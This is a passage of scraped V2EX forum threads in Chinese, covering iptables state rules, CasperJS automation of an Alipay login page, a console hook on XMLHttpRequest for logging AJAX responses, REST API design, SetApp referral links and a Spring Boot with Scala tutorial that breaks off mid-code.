"\r", " \r", "有些银行的网上银行到今天还是只支持 IE ，想不用 Windows 都不行", " 嵌入式估计得哭了", "windows 10 最新的版本不错的, 最近在尝试将 python/go 开发环境搭在 windows 下, 结果发现并没有以前想象的可怕, 而且, bash for windows 进展的相当不错, 目前以前完全超越的 cygwin 了, 好多服务都能跑了. 我想等今年后, 可用性会很好\r", "\r", "最近对苹果有点失望, 感觉无论软件和硬件都不是很理想, 这样对某些人而言就失去了吸引力, 就会想到避免被绑定, 以前选择 mac 是因为无论软件和硬件都是一流的, 但现在就不一样了.  其他的选择可能更吸引人", " 我也只是模仿楼上，别指我嘛。。"]},
{"content": ["<div class=\"topic_content\">centos7\r<br>\r<br>$:iptables  -nL --line-number\r<br>\r<br>Chain INPUT (policy DROP)\r<br>num  target     prot opt source               destination         \r<br>1    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0            state RELATED,ESTABLISHED\r<br>2    ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0           \r<br>3    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           \r<br>4    ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            state NEW tcp dpt:22\r<br>\r<br>\r<br>$:iptables-save\r<br>*filter\r<br>:INPUT DROP [24:3588]\r<br>:FORWARD DROP [0:0]\r<br>:OUTPUT ACCEPT [197:32015]\r<br>-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\r<br>-A INPUT -p icmp -j ACCEPT\r<br>-A INPUT -i lo -j ACCEPT\r<br>-A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT</div>"], "reply": "13", "tittle": "iptables 删除 1.ACCEPT all -- 0.0.0.0/0 0.0.0.0/0 state RELATED,ESTABLISHED，为啥 ssh 不能登录了？", "comment": ["疑问：\r", "1.第三条规则是 lo 的，这个可以不用考虑\r", "2.难道 ssh 除了“ state NEW tcp dpt:22 ”这块的数据，还有 “ state RELATED,ESTABLISHED ”这块的数据，所以需要两条配合起来？", "NEW 说明这个包是我们看到的第一个包。意思就是，这是 conntrack 模块看到的某个连接第一个包，它即将被匹配了。比如，我们看到一个 SYN 包，是我们所留意的连接的第一个包，就要匹配它。第一个包也可能不是 SYN 包，但它仍会被认为是 NEW 状态。这样做有时会导致一些问题，但对某些情况是有非常大的帮助的。例如，在我们想恢复某条从其他的防火墙丢失的连接时，或者某个连接已经超时，但实际上并未关闭时。\r", "\r", "ESTABLISHED 已经注意到两个方向上的数据传输，而且会继续匹配这个连接的包。处于 ESTABLISHED 状态的连接是非常容易理解的。只要发送并接到应答，连接就是 ESTABLISHED 的了。一个连接要从 NEW 变为 ESTABLISHED ，只需要接到应答包即可，不管这个包是发往防火墙的，还是要由防火墙转发的。 ICMP 的错误和重定向等信息包也被看作是 ESTABLISHED ，只要它们是我 们所发出的信息的应答。\r", "\r", "RELATED 是个比较麻烦的状态。当一个连接和某个已处于 ESTABLISHED 状态的连接有关系时，就被认为是 RELATED 的了。换句话说，一个连接要想是 RELATED 的，首先要有一个 ESTABLISHED 的连接。这个 ESTABLISHED 连接再产生一个主连接之外的连接，这个新的连接就是 RELATED 的了，当然前提是 conntrack 模块要能理解 RELATED 。 ftp 是个很好的例子， FTP-data 连接就是和 FTP-control 有 RELATED 的。还有其他的例子，比如，通过 IRC 的 DCC 连接。有了这个状态， ICMP 应 答、 FTP 传输、 DCC 等才能穿过防火墙正常工作。注意，大部分还有一些 UDP 协议都依赖这个机制。这些协议 是很复杂的，它们把连接信息放在数据包里，并且要求这些信息能被正确理解。\r", "\r", "INVALID 说明数据包不能被识别属于哪个连接或没有任何状态。有几个原因可以产生这种情况，比如，内存溢出，收到不知属于哪个连接的 ICMP 错误信息。一般地，我们 DROP 这个状态的任何东西。\r", "\r", "以上来自 ", " ，仅供参考。", "求不要沉，伟大的 e2vx", "state 是指 tcp 连接状态， state NEW 指客户新建一个到 22 端口的连接，你 accept 了，但是连接建立后，后续的包被 reject 了。", "为什么你会问“难道”这种话呢？看 NEW 和 ESTABILISHED 这俩词的意思还不明白？", "CentOS7 不是用 firewalld  管理的？", "你只放过了 state 是 NEW 的包啊，当 TCP 连接建立变成 Established 就被 DROP 了啊。", "难道只有我一个人看到 input 链所有包被 drop 么。其实 你用 iptables -nxvL 就知道哪来被 match 了。", "policy DROP 不符合规则的默认全部 drop ，然后你还去掉了 ESTABILISHED 的 accept ，那除了 NEW 的以外不就 drop 了么？", "  @", "  @", "  @", "  @", "    你们是对的，我没有对 new ， ESTABILISHED 没有理解", "   我禁止了 firewalld ，使用了 iptables", "哈哈， LZ 学习了就好， iptables 和 ip route 里面的坑不少，一个不小心服务器就连不上了。。\r", "另外建议把这几个的默认规则都设为 Accept ，在最后一行把所有剩下的 drop 就行。否则小手一抖，给 iptables flush 了，服务器就和互联网失联了。", " 说的很对。-P 是个大坑"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在做点东西. 遇到一个模拟支付的问题, 求有否同学遇到过类似的问题? 求个解决?</p>\n<ol>\n<li>\n<p>跳转支付\n<img alt=\"\" src=\"http://ww4.sinaimg.cn/large/0060lm7Tgy1fdxto51qjcj313a0ooq92.jpg\">\n这一步没问题</p>\n</li>\n<li>\n<p>输入账号密码\n<img alt=\"\" src=\"http://ww4.sinaimg.cn/large/0060lm7Tgy1fdxtod0njzj313c0o60vy.jpg\"></p>\n</li>\n</ol>\n<p>到这一步就有问题. 不能正确的输入密码. 使得在点击'下一步'时总提示'请填写支付密码'. 不知是否密码输入框做了什么限制?</p>\n<p>核心的代码在下面, 有招的同学帮忙给看看?</p>\n<pre><code>var pay = function() {\n    var self = this;\n    self.print('i am in pay');\n    self.wait(2000, function() {\n        self.capture('2.png');\n    });\n    self.print('i am in pay2');\n    var s_img = '#J_qrPayArea &gt; div.qrcode-img-wrapper &gt; div.qrcode-img-area &gt; div &gt; img';\n    self.waitForSelector(s_img, function() {\n        self.print('i am in pay3');\n        self.waitForSelector('#J_tip_qr &gt; a', function() {\n            self.click('#J_tip_qr &gt; a');\n            self.waitForSelector('#J_tip_pc &gt; a', function() {\n                self.wait(2000, function() {\n                    self.waitForSelector('#J_tLoginId', function() {\n                        self.print('i am in input account');\n                        self.evaluate(function() {\n                            var account = '';\n                            var pwd = '';\n                            document.querySelector('#J_tLoginId').value = account;\n                            document.querySelector('#payPasswd_input').value = pwd;\n                            document.querySelector('#J_newBtn').click();\n                        });\n                        //self.fill('#J_TloginForm', {\n                        //    'loginId' : a,\n                        //    'payPasswd_rsainput' : b\n                        //}, true);\n                        self.wait(4000, function() {\n                            self.capture('3.png');\n                        })\n                    });\n                });\n            });\n        });\n    });\n}\n</code></pre>\n</div></div>"], "reply": "5", "tittle": "casperjs 模拟支付宝登陆遇到问题. 行得通么?", "comment": ["- -那个不是控件么", "做过，坑很大，这些相对于支付宝的风控都不是事", "做过，登陆手机版的", " 详细说下?", " 给个思路, 哥?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>问题是多说导出的数据，导入畅言无法保留回复关联，索性自写了个 php 脚本，导出合适的数据，直接导入畅言既可。</p>\n<p>github 地址:<a href=\"https://github.com/Sorata/exportwordpresstochangyanjson\" rel=\"nofollow\">https://github.com/Sorata/exportwordpresstochangyanjson</a></p>\n</div></div>"], "reply": "3", "tittle": "多说停止运营后 WP 站点导出适合畅言的数据脚本", "comment": ["自带评论就很好，为啥严要用其他的？", "多谢", " 墙内垃圾留言过滤无法使用插件过滤,所以用第三方评论插件可以过滤大部分垃圾留言,比较方便"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我主要从里面找几个真正顺手的，再去购买。不过其实 setapp 每个月 10 刀也不是很贵，毕竟这么多 APP 。</p>\n<p>大概有这些 APP 的免费使用：</p>\n<p><img alt=\"image\" src=\"https://wx3.sinaimg.cn/large/400f4ee7ly1fdxa77i3b3j20ag13ugrm.jpg\"></p>\n<p><img alt=\"image\" src=\"https://wx3.sinaimg.cn/large/006AfH6uly1fdxaefv8wej30b813qn37.jpg\"></p>\n<p>setapp 最近做了个邀请机制，最多能免费 6 个月吧（不邀请的话免费 1 个月）： <a href=\"https://my.setapp.com/signup?referral=3bd89e15-c9bc-465b-8982-bca079014ee6\" rel=\"nofollow\">https://my.setapp.com/signup?referral=3bd89e15-c9bc-465b-8982-bca079014ee6</a></p>\n<p>不带小尾巴： <a href=\"https://setapp.com\" rel=\"nofollow\">https://setapp.com</a></p>\n</div></div>", "<div class=\"topic_content\">我的够啦，感兴趣的盆友点下面其他人的吧</div>"], "reply": "51", "tittle": "SetAPP 上百个 Mac APP 免费使用", "comment": ["借楼分享一下我的推荐链接： ", "借楼分享一下我的推荐链接： ", "哪里有上百个？", "我也借着分享一下我的推荐链接： ", "我是进来看头像的", "10 美元一月，这是免费?", "怎么还有重复的？", "忘记用了一楼还是二楼的链接, 也放下自己的 ", "没什么用，大部分用处不是很大。。", " 已用，\r", "放下自己的\r", "搭车\r", " 已用，\r", "我的 ", "搭个车 ", "借楼搭车\r", " 通过你的链接已注册.\r", "搭车: ", "搭车分享\r", "为啥我搜什么都是 no application found...", "也来一个 ", "搭车来个： ", "搭车 ", "搭车同求  ", "\r", "\r", "谢谢", " 搭车", "用了#22 的兄弟的 贴上自己的 ", "thx, add mine, ", " 用了你的\r", "\r", "不知道点了楼上的谁了。 ", "我也分享一个\r", "借楼～ \r", "我的邀请码： ", "嘛～点了楼上的旁友\r", "\r", "\r", "我也来一下", "借楼  ", "\r", "么么哒", "\r", "\r", "大家一起来接力！❤️", "上次卸载的时候 Setapp 文件夹 删不掉了，超级不爽😕", "楼上已用，搭个车\r", "楼上已用\r", "69 個！！！接近上百個了！！（哈哈哈）", " 懒得数随口一说，顺便吸引一下眼球", "  \r", "软件很多都没听过 有哪些比较好用的可以推荐吗？", "10 刀一个月。。。。", "借楼 ", "我竟然只知道 cleanmymac ……", "跟楼 ", "  借楼"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题, 最近打算写一个这样的服务, 把之前的一些 C 库以 RESTful API 的形式暴露出来供外部调用(目前暂时只考虑内部其他系统的访问), 请教做过类似工作的同学几个问题:</p>\n<ol>\n<li>\n<p>除了基本的功能外, 还有哪些坑需要设计的时候注意的? 高并发? 可靠性? 检测恶意输入?</p>\n</li>\n<li>\n<p>测试的话有哪些边缘测试用例可以检验服务是不是健壮呢?</p>\n</li>\n<li>\n<p>因为要根据用户的输入提供响应, 而用户的输入有可能很长, 所以考虑用 POST 把输入的字符串放到 body 里, 因为 GET 的 URL 后面参数太长的话可能会有问题? 但唯一一点顾虑是我这个服务其实没有改变服务器状态, 用 POST 感觉有点怪, 不知大家怎么看.</p>\n</li>\n</ol>\n<p>谢谢.</p>\n</div></div>"], "reply": "11", "tittle": "打算用 Python 包装一个现有的 C 库提供 REST 服务给外部调用, 除了功能之外需要考虑哪些方面呢? 谢谢", "comment": ["为什么不用 C 直接写 REST 服务？这样效率会更高\r", "\r", "另外在 REST 中 POST 的语义不是改变服务器的状态吧？建议 LZ 多参考一些优秀的 RESTful API 设计", "大量使用 POST 就违背了 RESTful 的初衷了……", " 谢谢, 请问为什么这么说? \r", "主要是因为用户要提交的输入可能很长, 用 GET 放到 URL 里感觉可能碰到长度限制吧, 另外好像 GET 里也不推荐用 body?", "同问为什么", "内部系统的话别管那么多规范了，先跑起来服务就可以。\r", "\r", "检测恶意参数是优先级最高的，不要相信任何客户端传过来的数据，所有参数都必须校验。是否考虑异步要看提供的服务是不是延时很高的，如果一个正常请求可能要几秒才能把处理好的数据返回，就需要考虑用异步框架在前面把请求都接住。后端开多台服务器提高负载能力，如果只是普通的业务，什么开发快用什么就好。\r", "\r", "测试的时候，有时间做边缘数据测试最好，要不至少也得在开发的时候考虑用户有没有可能传负数之类的数据，如果没有那么多时间，可以在编写代码的时候就采取防御式编程作为 RESTful 接口的策略。\r", "\r", "如果请求参数已经可能超过 GET 的限制，要放到 POST 里面做，那就不太符合 RESTful 的接口语义，等于应该分在 GET 和 POST 的资源操作都被合并到 POST 里面了，会导致你可能需要在 URL 上面做区分。\r", "比如 /source 是资源的 URL ，按 RESTful 的语义， GET 是获取 /source 的数据， POST 是新增 /source 的数据，你都合并到 POST 接口，可能就要在 URL 上面做区分，/getsource /newsource 这样才能实现资源的区分度。\r", "\r", "如果存在这种可能，或许不使用 RESTful 比较好，就在 URL 上面做语义区分。毕竟先提供服务才是主要的任务。能保证某些接口的幂等性就能少掉很多网络延迟导致的异常。", " 需求经常变你懂得", " 多谢你的详细回复, 信息量很大, 我先仔细看一下再行请教.", "内部 restful 不如 rpc", "非常不建议这么做\r", "建议采用内部走消息总线的 RPC 形式", "get 也可以有 body 的.\r", "读 elasticsearch 的文档时才意识到这一点.\r", "elasticsearch 的许多 api,都是 get 带 body 这样用的.", " \r", " \r", "\r", "请教为什么内部不建议用 Restful 呢, 除了性能外还有其他的原因吗? 谢谢."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>需要调试一个网站的 ajax,输出 ajax 的返回信息，网站的源码我是没法修改的，我是用控制台输入 js 代码，然后输出信息的，代码如下：\n(function(open) {\nXMLHttpRequest.prototype.open =function(method, url, async, user, pass) {\nthis.addEventListener(\"readystatechange\",function() {\nif(this.readyState == 4)\n{\n//在这可以获取到 response 数据，并且修改\nconsole.log(url);\nconsole.log(this.responseText);\n}\n}  ,false);\nopen.call(this, method, url, async, user, pass);\n};\n})(XMLHttpRequest.prototype.open);\n运行后可以输出一部分信息，但是有其他的 ajax 请求没有获取到，查看了下网站的 js ，\n貌似 ajax 是在另外的一个异步的 js 里面进行的请求，这种情况有什么办法获取请求信息没有？</p>\n</div></div>", "<div class=\"topic_content\">找到了，是在一个 iframe 里面，这种情况有什么办法处理 ajax 的请求吗</div>"], "reply": "3", "tittle": "询问个 js 的 XMLHttpRequest 的问题", "comment": ["额  如果你只是想看传输的数据的话，我觉得，你可以利用一下， chrome 的 Network 面板", " 这个东西是打算放 webdriver 用的，不只是调试用", "用 iframe.contentWindow 改 iframe 里的 XMLHttpRequest 方法.\r", "我没试过。你觉得 ok 就试试。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，想了解一下。</p>\n</div></div>", "<div class=\"topic_content\">补充说明及问题见截图：\r<br>\r<br><a target=\"_blank\" href=\"http://wx1.sinaimg.cn/mw690/b596b49dly1fdxuhlmjhdj20m809a0sy.jpg\" rel=\"nofollow\">http://wx1.sinaimg.cn/mw690/b596b49dly1fdxuhlmjhdj20m809a0sy.jpg</a>\r<br>\r<br>\r<br>查了一下 @<a target=\"_blank\" href=\"/member/cxh116\">cxh116</a> 说的 CodeMirror ，好像就是这个 :-)</div>"], "reply": "31", "tittle": "v2ex 的编辑器是什么编辑器？", "comment": ["这也叫编辑器啊!", "文本框", "就是个 textarea 而已", "没有任何编辑器", "你是想说 markdown 吗？", " ", "同求", "MD = =\r", "\r", "\r", "可以在正文中为你要发布的主题添加更多细节。 V2EX 支持 [GitHub Flavored Markdown]( ", ") 文本标记语法。\r", "在正式提交之前，你可以点击本页面左下角的“预览主题”来查看 Markdown 正文的实际渲染效果。", " #9  貌似回复不兹瓷 = =", " 对", "惊了，讲个笑话： V2EX 有编辑器", " 扣这种字眼有意思？", " 谢谢。\r", "\r", " 为什么你的图片显示不出来？同样是新浪的呢", " 我也奇怪呢（不是说 贴上图片地址就可以显示的吗", " \r", " \r", "因为 wx1 好像还不支持。", " #15 https", "是 CodeMirror 一个很神奇的文本编辑器…\r", "所以 V 站编辑器还能这样玩： ", " 确实没有编辑器，跟抠字眼有什么关系", "v2ex 的编辑器令我印象比较深的是会自动在输入的英文与中文之间添加空格，比如我输入\r", "哈哈哈 V2EX 真厉害（输入时没有空格）\r", "会自动转换成\r", "哈哈哈[空格]v2ex[空格]真厉害\r", "虽说是个小细节，但这样在中英文混输时，阅读体验会变得更舒适。", "难道不是多行文本框吗？", " 看到的话麻烦回一下。我因为这贴被降权了？", " 没有", " 多谢 那看来是 @我那家伙被降权了。。。", "楼歪了啊。大家还是说编辑器这件是吧。\r", "目前从[查看页面源码]( ", " @", " 说的用了 CodeMirror 。然后还有两个问题，前台编辑好了，提交保存，后端存储的是转换后的 html ，还是没有转换的 markdown ？哪种方式比较好呢？还有就是上面两种方式中将 markdown 转为 html 的工具哪些比较好？   提前谢大佬指教 :-)", " ，加 extensions 应该可以应对大部分 markdown 语法了。后端存储内容我猜测是两者都存。", " php 的有吗", " 不了解 php", " 存不转换的 markdown 好，不用做过滤。但前端渲染有个问题就是会明显的看到一堆文本从无排版的初始状态变成 html 的过程。楼主你不是 php 吗？前端走个 MVVM 框架，或者直接用 Laravel 那种直接与 vue 结合的，这样在切页的同时渲染就是看不出来的。", " V2EX 是怎么样的，了解吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如像产科医生这类的，能有点行业知识背景的。<br>\n微微一笑很倾城就算了。<br>\n其实这种主题的电视还是很好拍的吧，比如产品、研发、测试互相撕逼……</p>\n</div></div>"], "reply": "17", "tittle": "有没有程序员主题的电视啊？", "comment": ["硅谷啊", "黑客军团", "职业病？", "美剧：\r", "硅谷：程序员创业套路的故事\r", "黑客军团：精分程序员想要 F*ck 翻世界的故事\r", "\r", "动漫：\r", "小林家的龙女仆：日本 Python 程序媛的故事", "日剧：逃跑可耻但有用，讲述闷骚程序员泡结衣酱的故事", "多谢各位，《硅谷》貌似不错，先看着！", "硅谷 第 4 季也马上来了", "it crowd 好像是叫这个名字", "  小林家的龙女仆 + 1\r", "\r", "NEW GAME 算不算，游戏程序员的。。\r", "\r", "不过动漫里面的主角都是妹纸。。", " 我喜欢结衣，今晚下来看看 XD", "补充：\r", "美剧：\r", "《 Tron 崛起》（动漫美剧形式）：程序员创造的矩阵世界里发生的故事\r", "同题材 Tron 的起源电影\r", "《创战纪》：程序员儿子，在程序员老爸创造的程序世界里，和老爸一起打倒反派的故事", "1.生活大爆炸\r", "2.IT 狂人\r", "3.网络犯罪调查\r", "以前有人发过帖子了\r", "链接:https://www.v2ex.com/t/258331", "马一发", "超市特工", "以前看过两个美剧：奔腾年代和 IT 狂人", "逃耻～但应该不是楼主想要的那种什么产品，开发，测试撕逼的～(逃"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Github: <a href=\"https://github.com/sadhen/12-technologies-in-2017/tree/master/02-SpringBoot-with-Scala\" rel=\"nofollow\">https://github.com/sadhen/12-technologies-in-2017/tree/master/02-SpringBoot-with-Scala</a></p>\n<p>非常欢迎 watch ，并在 issue 中和我讨论。文章中有些是我在平日里常用的，有些是现学现卖的，请老司机们多多指点。</p>\n<p>仔细阅读可能需要花费 1 小时及以上，如果你刚刚接触 SpringBoot 的话。 Reading List 都是我读过一遍的，作者的工作经验基本都比我丰富，写得也比较好，如果你觉得本文不值一读， Reading List 或许能入你法眼。</p>\n<p>不太满意排版的同学可以试试看这里，是我自己写的 Markdown Editor Render 的： <a href=\"http://fromwiz.com/share/s/2yNneO1LOQap2-bdmA21_AH13kXxsU1xSk3F29ZIWR0BfOSR\" rel=\"nofollow\">http://fromwiz.com/share/s/2yNneO1LOQap2-bdmA21_AH13kXxsU1xSk3F29ZIWR0BfOSR</a></p>\n<h1>Spring Boot with Scala</h1>\n<h2>前言</h2>\n<p>本文提供一个示例项目，如果你觉得代码更加亲切，请移步至<a href=\"https://github.com/sadhen/spring-boot-with-scala\" rel=\"nofollow\">Spring Boot with Scala</a>。</p>\n<h2>Bootstrap</h2>\n<p>第一步，我们从零开始构建一个五脏俱全的工程。注意，是工程，而不是代码片段。通常来说，一个工程需要开发、构建、测试、部署、监控等环节。</p>\n<h3>开发</h3>\n<p>大多数程序员并不聪明也不勤奋。一般而言，从零开始写一个工程实际上非常吃力。所以很多框架都会提供脚手架工程。 Spring Boot 官网就提供了<a href=\"http://start.spring.io\" rel=\"nofollow\">start.spring.io</a>，快速生成脚手架工程。可惜并没有提供 Scala 相关的脚手架工程。故而，本文的示例项目实际上也是一个脚手架项目。</p>\n<p>本文将只采用 Maven 作为构建工具。</p>\n<h3>构建与部署</h3>\n<p>本节主要讨论构建工具。在阅读清单 2 中已经有比较详细的介绍了，这里讨论一些值得注意的细节和改进。</p>\n<p>使用<code>spring-boot-maven-plugin</code>打包的话实际上会生成一个 executable jar ，我们执行<code>java -jar target/spring-boot-with-scala-1.0.jar</code>便可以运行。然而这并不美好。当我们在服务器上运行这个 jar 时，最好能有<code><a href=\"http://start.sh\" rel=\"nofollow\">start.sh</a></code>和<code><a href=\"http://stop.sh\" rel=\"nofollow\">stop.sh</a></code>脚本管理程序的启动和中止。我们把事先编写好的启动和中止脚本放在 bin 目录下，然后用<code>maven-jar-plugin</code>，<code>maven-dependency-plugin</code>和<code>maven-assembly-plugin</code>生成<code>spring-boot-with-scala-1.0-bin.tar.gz</code>，然后部署到服务器上。</p>\n<p><code><a href=\"http://start.sh\" rel=\"nofollow\">start.sh</a></code>脚本中提供了一种覆盖 jar 中的 application.properites 的方法，即使用<code>spring.config.location</code>，在本文的项目中将这个配置文件的默认地址设置为<code>conf/application.properties</code>，如果没有这个文件，就使用 jar 中的配置。</p>\n<h3>日志</h3>\n<p>引入<code>spring-boot-start-logging</code>后， Spring Boot 会使用 slf4j-api 和 logback 作为应用日志框架。 Java 的日志系统非常混乱，建议阅读材料 10 ，理一下思路。</p>\n<p>slf4j 很好地解决了日志的性能问题。在处理日志时，我们希望字符串的拼接是 lazy 的。使用 Java 8 可以这样解决问题：<code>logger.debug(() -&gt; \"hello \" + getValue())</code>。然而略显啰嗦， slf4j 提供了这种方式：<code><a href=\"http://logger.info\" rel=\"nofollow\">logger.info</a>(\"hello {}\", name)</code>，不失其优雅。</p>\n<p>因为我们是用 Scala ，所以推荐使用<a href=\"https://github.com/Log4s/log4s\" rel=\"nofollow\">log4s</a>。这样就可以愉快地使用 Scala 的字符串插值特性，而不失其性能。如官网所言：</p>\n<blockquote>\n<p>Log4s goes even further in that it uses macros to manipulate the execution so that the string interpolations are not even performed unless the logger is enabled. It does this by inspecting the structure of the argument that you pass into the logger.</p>\n</blockquote>\n<p>材料 4 讲解了 Spring1.5.x 动态修改日志级别的新特性，本文的示例工程中提供了<code><a href=\"http://loglevel.sh\" rel=\"nofollow\">loglevel.sh</a></code>脚本：</p>\n<pre><code>bin/loglevel.sh com.sadhen  # 显示 package com.sadhen 的日志级别\nbin/loglevel.sh com.sadhen DEBUG # 将 package com.sadhen 的日志级别设置为 DEBUG\n</code></pre>\n<h2>TDD</h2>\n<p>测试的话，主要是用 spring-boot-starter-test, JUnit 和 ScalaTest 。在 Maven 中声明这些依赖时需要指定 scope 为 test ，以表明这些依赖只对测试 classpath 有效。</p>\n<h3>从 Assert 开始</h3>\n<p>我们可以混用 ScalaTest 和 JUnit ，使用了 ScalaTest 并不意味着不使用 JUnit 。就像学习 Scala ，并不能放弃深入学习 Java 。而是在比较、揣摩两者的差异时，学习如何写出一手高质量的代码。</p>\n<p>ScalaTest 的 assert 是一个宏，可以抛出非常可读的 Error Message ：</p>\n<pre><code>import org.scalatest.Assertions._\nassert(a == b || c &gt;= d)\n// Error message: 1 did not equal 2, and 3 was not greater than or equal to 4\nassert(xs.exists(_ == 4))\n// Error message: List(1, 2, 3) did not contain 4\n</code></pre>\n<p>如果你也恰巧读过 Clean Code ，是否还记得函数那一章讲到没有参数的函数是最好的，一个参数的函数不复杂，两个参数的函数就需要程序员在时候的时候注意参数的顺序了。三个及以上参数的函数就不太妙了。即使 Intellij 如此智能，程序员还是很容易犯错。至少，你在使用 assertEquals 的时候，每一次都需要等 IDE 的提示出来才能愉快自信的了解的每个参数的真正含义。</p>\n<h3>有依赖注入的类怎么测试</h3>\n<p>很简单:</p>\n<pre><code>@RunWith(classOf[SpringRunner])\n@SpringBootTest\nclass SampleTest {\n  @Autowired\n  var sampleService: SampleService = _\n\n  def testSampleService = ???\n}\n</code></pre>\n<p>下面这个例子演示了如何测试 Rest Controller ，其实也很简单，主要是利用了 spring-boot-starter-test 里面提供的 TestRestTemplate 。其中有些 json4s 的语法或许你没有接触过，且看下文。</p>\n<pre><code>@RunWith(classOf[SpringRunner])\n@SpringBootTest(webEnvironment = WebEnvironment.RANDOM_PORT)\nclass HelloControllerTest {\n  @Autowired\n  var restTemplate: TestRestTemplate = _\n\n  @Test\n  def testHello(): Unit = {\n    val body = restTemplate.getForObject(\"/api/hello\", classOf[JsonNode])\n    val expected = (\"code\" -&gt; 0) ~\n      (\"data\" -&gt; (\"hello\" -&gt; \"中国\") ~ (\"year\" -&gt; 2017)) ~\n      (\"error\" -&gt; JNull)\n    assert {\n      fromJsonNode(body) == expected\n    }\n  }\n}\n</code></pre>\n<p>但是这种测试有个弊端，由于需要初始化上下文，每次都需要等上好长一段时间。</p>\n<h3>ScalaMock</h3>\n<p>ScalaMock 就是用来解决上文提到的问题的。看代码：</p>\n<pre><code>class HelloControllerSpec extends FlatSpec with Matchers with MockFactory {\n\n  \"/api/hello\" should \"be ok\" in {\n    val worldService = stub[WorldService]\n    (worldService.getCountry _).when().returns(\"法国\")\n\n    val helloController = new HelloController(worldService)\n\n    val expected = (\"code\" -&gt; 0) ~\n      (\"data\" -&gt; (\"hello\" -&gt; \"法国\") ~ (\"year\" -&gt; 2017)) ~\n      (\"error\" -&gt; JNull)\n\n    assert {\n      fromJsonNode(helloController.hello) == expected\n    }\n  }\n}\n</code></pre>\n<p>这个例子中，我们 mock 了一个 WorldService ，通过指定 getCountry 方法的返回值定义了 worldService 的行为模式。从而不需要初始化上下文就可以完成 Rest Controller 的测试。</p>\n<h3>后记</h3>\n<p>这里面还有很多话题没有提及，比如异步的单元测试等等。为什么单元测试那么重要呢，因为实际上单元测试就是第一手的最准确的文档。如果你要用一个开源的库，恰好他的文档写得不够详细，那么多数情况下你都可以从单元测试中获得你的答案。如果遍历它的单元测试都没有找到库的正确用法，或许是你的水平没有到家，更可能的是这个库写得并不好，建议<strong>不要</strong>去使用它。</p>\n<h2>Scala</h2>\n<p>前面讲的比较多还是 Spring Boot 本身，那么为什么要 Scala 呢？已经有很多比较 Java 和 Scala 文章了，这里不赘述。阅读清单中 3 和 6 都值得一看。下面简单谈一谈那些尤为重要的 Scala 特性。</p>\n<h3>惰性求值</h3>\n<p>在程序语言理论中，<strong>惰性求值</strong>是一种求值策略，它将表达式的求值计算延迟到实际用到这个值的时刻，以避免重复计算（翻译自维基百科，见阅读清单 8 ）。</p>\n<p>用 Java 举个例子：</p>\n<pre><code>class LazyDemo {\n  String lazyString = null;\n\n  private String initialize() {\n    // 比较耗时的初始化\n    String result = ...\n    return result;\n  }\n\n  void fun1() {\n    // 一些和 lazyString 无关的代码\n    if (lazyString == null) {\n        lazyString = initialize()\n    }\n    // 下面开始需要使用 lazyString\n  }\n\n  void fun2() {\n    // 一些和 lazyString 无关的代码\n    if (lazyString == null) {\n        lazyString = initialize(lazyString)\n    }\n    // 下面开始需要使用 lazyString\n  }\n}\n</code></pre>\n<p>维基百科里面提到惰性求值的优点有三：</p>\n<ol>\n<li>提供了控制结构抽象化的能力</li>\n<li>提供了定义无穷数据结构的能力</li>\n<li>在对复合表达式的求值过程中避免了无谓的计算和错误处理</li>\n</ol>\n<p>对于 1 ，实际上 Scala 中的<code>Try</code>和<code>future</code>是非常直观的例子，我们也可以自定义一些参数是代码块的函数，由于 Scala 允许最后一个参数体的<code>()</code>改写成<code>{}</code>，形式上其实非常有美感。对于 2 ，在 Scala 中体现在 Stream 这个集合中。另外，<code>lazy</code>关键字也是至关重要的。比如下面这个例子：</p>\n<pre><code>// Java Code\nLong ret = null;\nif (noNeedToCalculateResult) {\n  // branch 1\n} else {\n  ret = calculate();\n  if (ret == -1) {\n    // branch 2\n  } else {\n    // branch 3\n  }\n}\n\n// Scala Code\nlazy val ret = calculate()\nif (noNeedToCalculateResult) {\n  // branch 1\n} else if (ret == -1) {\n  // branch 2\n} else {\n  // branch 3\n}\n</code></pre>\n<p>在 Scala 中使用 lazy ，便可以减少<code>if-else</code>分支结构的层次，使代码逻辑更加清晰可读。对于<code>LazyDemo</code>，改写成 Scala ，也简化了许多：</p>\n<pre><code>class LazyDemo {\n  lazy val lazyString: String = initialize\n\n  def initialize: String  = ???\n\n  def fun1() {\n    // 一些和 lazyString 无关的代码\n    // 下面开始需要使用 lazyString\n  }\n\n  def fun2() {\n    // 一些和 lazyString 无关的代码\n    // 下面开始需要使用 lazyString\n  }\n}\n</code></pre>\n<p>最初用于演示延迟计算的例子中，如果 fun1 和 fun2 并发执行，会带来严重的问题。涉及到双重检测锁(DCL)，请参考阅读清单 7 和 9 。</p>\n<h3>代码风格</h3>\n<p>使用 ScalaStyle 和 scalafmt 。 scalafmt 有 IntelliJ 的插件。如果是在公司，可以使用 SonarQube 配置一套团队公用的 ScalaStyle 配置。</p>\n<h3>Utilities</h3>\n<p>这里简单谈一谈对一些工具库的选择。基本上我都会选择那些基于久经考验的相关 Java 库的封装。这些库一般都会提供一些 Scala 语言特性上的适配，然后提供一些比较友好的 DSL 。那么为什么不选择 pure scala 呢？通常情况下，那些 pure scala 的库会重度依赖 Akka ， Scalaz 等著名的库，由于很多是新造的轮子，并没有经历时间的考验，其实非常 buggy 。如果你使用它们，你就得做好撸起袖管 fork 的准备。</p>\n<h4>mybatis</h4>\n<p>因为大家都习惯用 druid 和 mybatis 的组合。所以这里我选择用 mybatis 。其实 slick 也非常好用，只不过没有和 Spring Boot 的集成。写 Java 的话，大家习惯用 lombok ，在 Scala 里面没法用。我们可以用 @BeanProperty 这个注释做到类似的效果(可惜没法用 case class)。</p>\n<pre><code>class SQLStatDO {\n  @BeanProperty var id: Long = _\n  @BeanProperty var user: String = _\n  